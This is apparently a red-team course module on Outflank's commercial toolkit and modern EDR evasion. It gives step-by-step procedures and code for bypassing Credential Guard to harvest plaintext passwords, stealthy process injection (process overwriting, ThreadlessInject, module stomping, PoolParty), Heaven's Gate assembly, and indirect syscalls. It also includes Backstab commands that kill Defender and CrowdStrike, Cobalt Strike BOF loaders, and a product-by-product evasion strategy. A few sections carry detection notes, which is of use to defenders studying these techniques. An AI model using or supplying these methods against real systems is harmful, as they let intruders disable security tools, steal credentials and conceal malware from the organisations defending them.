Outflank OST & Modern EDR Evasion

Overview

This module covers Outflank Security Tooling (OST) — a commercial red team toolkit by Dutch firm Outflank — and the modern EDR evasion techniques OST implements or builds upon. These techniques represent the current state of the art against enterprise EDR products (CrowdStrike Falcon, SentinelOne, Microsoft Defender for Endpoint, Carbon Black). Many OST concepts originate from public security research but are packaged for operational use.

OST is a subscription-based toolkit requiring commercial licensing. The techniques documented here are based on publicly available research, conference talks, and OST-related blog posts from Outflank.

BypassCredGuard

Windows Credential Guard (introduced in Windows 10 1607) runs LSASS in a Hyper-V isolated VTL1 process called LsaIso. WDigest secrets are stored in LsaIso and are unavailable to tools like Mimikatz that read LSASS memory from VTL0. BypassCredGuard re-enables WDigest caching by patching wdigest.dll in memory — causing LSASS to cache plaintext credentials again for the next authentication.

# How Credential Guard blocks credential harvesting:
# - LSASS still runs in VTL0 but sensitive secrets (WDigest, SSP data)
#   are stored in LsaIso (VTL1 — Isolated User Mode)
# - Mimikatz sekurlsa::wdigest fails — memory region is in a protected VTL
# - Mimikatz sekurlsa::logonpasswords shows NT hashes only (no plaintext)

# BypassCredGuard technique:
# 1. Locate wdigest.dll loaded in LSASS process memory
# 2. Find the UseLogonCredential and IsCredGuardEnabled flags in wdigest.dll
# 3. Patch UseLogonCredential = 1 (enable plaintext caching)
# 4. Patch IsCredGuardEnabled = 0 (tell WDigest that CG is absent)
# 5. After next user authentication, WDigest stores plaintext in LSASS memory
# 6. Run Mimikatz sekurlsa::wdigest to retrieve the cached credential

# Registry equivalent (requires reboot — noisy):
reg add "HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest" /v UseLogonCredential /t REG_DWORD /d 1 /f
# BypassCredGuard avoids this registry write (live memory patch only)

# Requirements:
# - SeDebugPrivilege (local admin or SYSTEM)
# - Credential Guard must be enabled via Hyper-V virtualization
# - Target must authenticate after the patch is applied

# Detection:
# - Memory write to wdigest.dll from a non-system process
# - Sysmon Event 10 (process access) to lsass.exe with suspicious source
# - MDE: "Credential access via LSASS memory" (built-in)

Process Overwriting

Process overwriting loads a malicious payload into a legitimate process image without unmapping the original — unlike classic process hollowing. The technique creates a process from a legitimate binary, then overwrites the process's executable memory before the entry point is reached, making the process appear legitimate to memory scanners that check image-backed regions.

# Classic process hollowing (detected by modern EDR):
# 1. CreateProcess (suspended)
# 2. NtUnmapViewOfSection — unmaps the original executable (EDR flag)
# 3. VirtualAllocEx — allocates new RWX memory
# 4. WriteProcessMemory — writes shellcode
# 5. SetThreadContext — sets EIP/RIP to shellcode
# 6. ResumeThread

# Why EDR detects hollowing:
# - NtUnmapViewOfSection on the main module is anomalous
# - New RWX allocation not backed by a file on disk (unbacked executable)
# - PE header in memory differs from PE header on disk

# Process Overwriting (evades the above):
# 1. CreateProcess (suspended) — target: svchost.exe, notepad.exe, etc.
# 2. Do NOT unmap the original executable
# 3. Overwrite .text section bytes of the original mapped image in memory
#    using WriteProcessMemory targeting the existing mapped image base
# 4. The shellcode is written INTO the legitimate file-backed mapping
# 5. ResumeThread — thread starts executing "from" the legitimate image

# Result: the process image in memory matches a real binary on disk (file-backed)
# EDR memory scanners see a legitimate image header — no unmapped/orphaned regions
# Shellcode executes but appears to live within svchost.exe's mapped image

# Process Herpaderping (related — disk-level bypass):
# 1. CreateFile (new file path, read/write)
# 2. WriteFile — write malicious PE to the file
# 3. CreateSection from the file (maps malicious PE)
# 4. Overwrite the file on disk with a legitimate binary BEFORE process creation
# 5. CreateProcess using the section handle — process runs malicious code
#    but on-disk image appears legitimate when EDR checks it
# Reference: https://github.com/jxy-s/herpaderping

# Process Doppelganging (NTFS Transactions):
# 1. CreateTransaction (TxF — NTFS transacted write)
# 2. CreateFileTransacted — open a legitimate file under a transaction
# 3. WriteFile — overwrite it with malicious PE (within transaction)
# 4. CreateSection — map the transacted file
# 5. RollbackTransaction — roll back the write (original file restored on disk)
# 6. CreateProcess from the section — runs malicious code, disk shows original
# Limitation: TxF disabled in Windows 10 1903+ mitigations

ThreadlessInject

ThreadlessInject injects and executes shellcode in a remote process without creating a new thread or using APC queuing — the two injection primitives most monitored by EDR hooks. Instead, it overwrites the first few bytes of an exported function in the target process, replacing them with a trampoline that executes the shellcode when the export is next called by the target process itself.

# Traditional injection methods and their EDR detection points:
# CreateRemoteThread:    EDR hooks NtCreateThreadEx — high visibility
# APC injection:         EDR hooks NtQueueApcThread — detected
# SetWindowsHookEx:      hooks DLL load events
# RtlCreateUserThread:   hooks NtCreateThreadEx internally

# ThreadlessInject technique (published by CCob / @netscaler_hax0r, 2023):
# 1. OpenProcess with PROCESS_VM_READ | PROCESS_VM_WRITE | PROCESS_VM_OPERATION
# 2. Find the target export in the remote process (e.g., Sleep in kernel32.dll)
#    — use GetProcAddress locally, then calculate remote address from module base
# 3. Allocate RX memory in remote process for shellcode
# 4. Write shellcode to the RX allocation (WriteProcessMemory)
# 5. Overwrite the first bytes of the target export with a jump instruction:
#    - Save original bytes first (for cleanup)
#    - Write: FF 25 00 00 00 00 [shellcode_address_64bit]  (JMP [RIP+0])
#    - This is an indirect JMP that redirects to the shellcode
# 6. Wait — when the target process next calls the patched export,
#    the existing thread executes the shellcode naturally
# 7. Restore the original bytes after shellcode completes (optional)

# Why it bypasses EDR:
# - No NtCreateThreadEx / NtQueueApcThread calls (no new thread created)
# - No RWX allocation needed for the trampoline (overwrite existing RX export)
# - The shellcode runs on an existing, legitimate thread
# - EDR hooks looking for thread creation see nothing anomalous

# Practical considerations:
# - Pick a frequently-called export (Sleep, GetTickCount) to trigger quickly
# - Pick a target process that calls the export regularly (e.g., beacon process itself)
# - Shellcode must be position-independent and return cleanly to restore execution
# - github.com/CCob/ThreadlessInject — public PoC implementation

Backstab — Killing PPL-Protected EDR Processes

EDR processes run as PPL (Protected Process Light) under Windows — a kernel-enforced protection that prevents standard user-mode processes from opening handles to them. Backstab exploits a leaked handle: a process that already holds a valid handle to the EDR process can share it with an attacker-controlled process, bypassing PPL restrictions.

# PPL protection prevents:
# OpenProcess(PROCESS_TERMINATE, ...) on PPL processes from non-PPL callers
# Result: TerminateProcess() fails with ACCESS_DENIED even as SYSTEM

# Backstab technique (published by Yaxser, 2021):
# 1. Find a process that already has an open handle to the target EDR process
#    - Use the Windows handle table: NtQuerySystemInformation(SystemHandleInformation)
#    - Find handles with PROCESS_TERMINATE access to the EDR process
#    - Common holder: WerFaultSecure.exe (Windows Error Reporting) holds handles during crash analysis
# 2. DuplicateHandle from the handle-holding process to own process:
#    - OpenProcess(PROCESS_DUP_HANDLE) on the handle-holder (not the EDR)
#    - DuplicateHandle from holder → attacker process
# 3. Call TerminateProcess using the duplicated handle
#    - The kernel validates the handle's access mask, not the caller's PPL level
#    - Since the handle already has PROCESS_TERMINATE, TerminateProcess succeeds

# Alternative: BYOVD to remove PPL protection at kernel level
# - Use a vulnerable driver to modify the EPROCESS.Protection byte to 0
# - After clearing protection, standard TerminateProcess works

# Backstab CLI usage (github.com/Yaxser/Backstab):
Backstab.exe -n MsMpEng.exe -k       # find and kill Windows Defender
Backstab.exe -n CsSensorService.exe -k  # find and kill CrowdStrike sensor

# Detection:
# - NtQuerySystemInformation(SystemHandleInformation) with high frequency
# - DuplicateHandle calls between unrelated processes
# - BYOVD driver load preceding EDR termination

Module Stomping / Module Overloading

Module stomping overwrites the .text section of a legitimately loaded DLL in the current or remote process with shellcode. Because the shellcode occupies a file-backed, already-loaded module region, EDR memory scanners see an image-backed executable region — bypassing checks for unbacked RWX allocations.

# Why unbacked memory detections fail here:
# Normal shellcode injection: VirtualAlloc → RWX region not backed by file → EDR alert
# Module stomping: shellcode lives in a file-backed DLL region → appears legitimate

# Steps:
# 1. Load a target DLL that is not monitored/used by EDR:
#    LoadLibraryEx("xpsservices.dll", NULL, DONT_RESOLVE_DLL_REFERENCES)
#    # Prefer rarely-used DLLs: xpsservices.dll, dxgi.dll, mshtml.dll
# 2. Change protection of the .text section to RW:
#    VirtualProtect(dllBase + textOffset, textSize, PAGE_READWRITE, &oldProtect)
# 3. Write shellcode over the .text section:
#    memcpy(dllBase + textOffset, shellcode, shellcodeSize)
# 4. Restore original protection:
#    VirtualProtect(dllBase + textOffset, textSize, PAGE_EXECUTE_READ, &oldProtect)
# 5. Execute shellcode at the DLL base + entry offset:
#    CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)(dllBase + textOffset), NULL, 0, NULL)

# Remote module stomping (in another process):
# 1. Identify a DLL loaded in the target process that is not actively used
# 2. VirtualProtectEx → change to RW
# 3. WriteProcessMemory → write shellcode
# 4. VirtualProtectEx → restore RX
# 5. CreateRemoteThread or ThreadlessInject to execute

# Detection evasion:
# - Shellcode is image-backed (DLL file on disk) — avoids "unbacked executable" alert
# - The modified DLL's in-memory content differs from on-disk content
# - Advanced EDR (CrowdStrike, SentinelOne) hashes loaded module sections on load
#   and rescans periodically — if hash changes, it flags the modification
# - OPSEC: prefer DLLs loaded late (not at process start) to reduce rescan window

Heaven's Gate — WoW64 Syscall Execution

Heaven's Gate exploits WoW64 (32-bit processes on 64-bit Windows) to switch CPU mode from 32-bit (Ring 3 compatibility) to 64-bit and execute 64-bit syscalls directly. EDR hooks in 32-bit ntdll.dll are bypassed entirely because the syscalls go straight to 64-bit kernel mode.

# WoW64 process memory layout:
# 32-bit ntdll.dll — loaded at 0x7xxxxxxx — hooked by EDR (32-bit hooks)
# 64-bit ntdll.dll — loaded at 0x7ffxxxxxxx — often unhooked (EDR focuses on 32-bit)
# 64-bit kernel32.dll, etc. — also present in WoW64 address space

# Heaven's Gate technique:
# In a 32-bit process, use a far JMP to CS selector 0x33 to switch to 64-bit mode:
# (inline asm in MSVC):
__asm {
    push 0x33           ; 64-bit code segment selector
    call $ + 5          ; push next EIP
    add [esp], 5        ; adjust to 64-bit stub
    retf                ; far return — switches to 64-bit mode
}
; At this point, execution is 64-bit
; Can now call 64-bit functions directly, including 64-bit ntdll syscall stubs
; Syscall number differs between 32-bit and 64-bit ntdll

# Practical use: load shellcode in 32-bit process, use Heaven's Gate to
# make 64-bit NtCreateThreadEx / NtAllocateVirtualMemory calls
# bypassing all 32-bit EDR hooks

# Detection:
# - CS register change to 0x33 in a 32-bit process (unusual)
# - Execution in 64-bit ntdll from a 32-bit process context

Indirect Syscalls — RecycledGate and Hardware Breakpoints

Direct syscalls (SysWhispers2, HellsGate) execute syscall instructions from within the implant's .text section — EDR detects the syscall instruction executing outside ntdll. Indirect syscalls instead jump into the ntdll syscall stub (after the hook patch) to execute the syscall instruction from within ntdll itself. RecycledGate and hardware breakpoint techniques refine this further.

# Direct syscall (SysWhispers2 style) — detected by modern EDR:
# The syscall instruction executes from the implant's memory region
# EDR: flag syscall from non-ntdll address

# Indirect syscall — jump into ntdll stub to use its syscall instruction:
# 1. Locate the syscall gadget in ntdll (the actual syscall;ret bytes)
# 2. Place the syscall number in EAX/RAX
# 3. JMP to the ntdll gadget address (instead of executing syscall inline)
# Result: syscall instruction is in ntdll — EDR stack walk sees ntdll as caller

# RecycledGate (Outflank, 2022):
# Improvement over basic indirect syscalls:
# 1. Extract syscall numbers from a clean (unhooked) ntdll — from disk or KnownDlls
# 2. For each syscall, find the corresponding syscall gadget in ntdll
# 3. Before calling: set up arguments in correct registers/stack
# 4. Use the ntdll syscall;ret gadget — avoids the EDR hook entirely
# Key: "recycles" existing ntdll gadgets rather than emitting new asm

# Hardware Breakpoint technique (VEH-based syscalls):
# 1. Register a VEH (Vectored Exception Handler) in the process
# 2. Set a hardware debug breakpoint (DR0-DR3) on a hooked ntdll function:
#    ctx.Dr0 = NtCreateThreadEx_address;  ctx.Dr7 = 0x1; SetThreadContext(...)
# 3. When the hooked function is called, CPU triggers a debug exception BEFORE
#    the EDR hook code executes
# 4. VEH intercepts the exception, redirects execution to syscall gadget directly
# 5. EDR hook never executes — it is jumped over by the hardware breakpoint

# Tool references:
# SysWhispers2/3: github.com/jthuraisamy/SysWhispers2
# HellsGate:      github.com/am0nsec/HellsGate
# RecycledGate:   outflank.nl/blog/2022/09/26/syscalls-recycled-gate/
# TartarusGate:   combines HellsGate with dynamic SSN resolution

PoolParty — Thread Pool Injection

PoolParty (SafeBreach Labs, 2023) is a suite of process injection techniques that abuse Windows thread pool internals. By manipulating thread pool worker factories, work items, or I/O completion ports, shellcode executes on an existing thread pool thread — no new thread creation and no suspicious API calls.

# PoolParty variant 1 — Remote Thread Pool Worker Factory:
# 1. OpenProcess on target (PROCESS_ALL_ACCESS)
# 2. Query target process for TP_WORKER_FACTORY objects via NtQueryInformationProcess
# 3. Allocate shellcode in target with NtAllocateVirtualMemory
# 4. Write shellcode with NtWriteVirtualMemory
# 5. Modify the worker factory's StartRoutine pointer (points to shellcode)
# 6. NtSetInformationWorkerFactory to trigger a new worker thread
#    — existing thread pool creates a thread to execute the "factory routine"
#    — that routine is now our shellcode

# PoolParty variants (8 total):
# Remote:  Worker Factory, TP_WORK, TP_IO, TP_ALPC, TP_JOB, TP_WAIT, TP_DIRECT, TP_TIMER

# Why it bypasses EDR:
# - No CreateRemoteThread / NtCreateThreadEx (monitored APIs)
# - Thread execution initiated by the kernel via the thread pool mechanism
# - Shellcode address appears as a worker factory "start routine" — blend-in
# Reference: safebreach.com/blog/2023/process-injection-novel-windows-thread-pool-exploitation-technique-poolparty/

Cobalt Strike BOF Integration

Beacon Object Files (BOFs) are compiled C object files that execute in-process within the Cobalt Strike beacon. They avoid fork&run (no child process spawned) and complete execution quickly, making them harder to detect than traditional post-exploitation tools.

# BOF compilation (x64, MSVC):
cl.exe /c /GS- /W0 /Fo tool.o tool.c
# /c = compile only (no link), /GS- = no security cookie, /W0 = suppress warnings

# BOF compilation (MinGW):
x86_64-w64-mingw32-gcc -o tool.o -c tool.c

# Loading a BOF in Cobalt Strike:
# Via inline-execute (Aggressor console):
beacon> inline-execute /path/to/tool.o [arg1] [arg2]

# Via aggressor script (automate loading):
sub run_bof {
    binput($1, "Running custom BOF...");
    $data = readb(script_resource("tool.o"), -1);
    binline_execute($1, $data, "z", "argument_string");
}

# Common community BOF repositories:
# - TrustedSec/BOF-Collection    — credential access, discovery, lateral movement
# - CoreHound                    — advanced post-exploitation BOFs
# - outflanknl/cobalt-strike-bof — Outflank's public BOFs
# - bof-launcher (Havoc)         — BOF execution outside Cobalt Strike
# - EthicalChaos/BOFs            — token manipulation, privilege escalation

# OST BOFs (examples from public documentation):
# - BypassCredGuard.o  — in-memory wdigest patch
# - Backstab.o         — kill PPL EDR processes
# - ProcessOverwrite.o — process overwriting injection

Modern EDR Evasion — Strategy Summary

# Layer-by-layer evasion approach:

# Layer 1 — File/Static Detection:
# - Shellcode encryption (AES/ChaCha20) with key derivation at runtime
# - PE obfuscation: stomped header, removed DOS stub, scrambled section names
# - See: PE Obfuscation and Malware Development modules

# Layer 2 — AMSI / Script Scanning:
# - AMSI bypass in PowerShell/JScript before loading any suspicious content
# - See: AMSI Bypass module

# Layer 3 — Userland API Hooks (EDR ntdll hooks):
# - DLL unhooking: replace hooked ntdll with clean copy from disk / KnownDlls
# - Indirect syscalls (RecycledGate, HellsGate) to bypass hooks entirely
# - See: DLL Unhooking module

# Layer 4 — Memory Scanning (unbacked allocations, shellcode patterns):
# - Module stomping: shellcode in file-backed DLL region
# - Sleep obfuscation: encrypt beacon in memory during sleep (Ekko/Foliage)
# - See: Sleep Obfuscation module

# Layer 5 — Behavioral Detection (thread creation, process hollowing):
# - ThreadlessInject / PoolParty: avoid monitored injection APIs
# - Process overwriting: avoid unbacked executable regions

# Layer 6 — Stack Analysis (call stack inspection):
# - Stack spoofing: synthetic return addresses pointing into ntdll/kernel32
# - See: Stack Spoofing module

# Layer 7 — Kernel-Level Detection (ETW, callbacks):
# - ETW bypass: patch EtwEventWrite in ntdll
# - BYOVD: remove EDR kernel callbacks via vulnerable driver
# - See: ETW Bypass module and LOLDrivers section above

# EDR-specific notes:
# CrowdStrike Falcon:  Strong kernel callback monitoring; BYOVD is primary bypass vector
# SentinelOne:         Memory scanning at alloc time; module stomping effective
# MDE (Defender):      AMSI + behavioural rules; indirect syscalls + sleep obfuscation
# Carbon Black:        File-based + process lineage; focus on parent-child anomalies
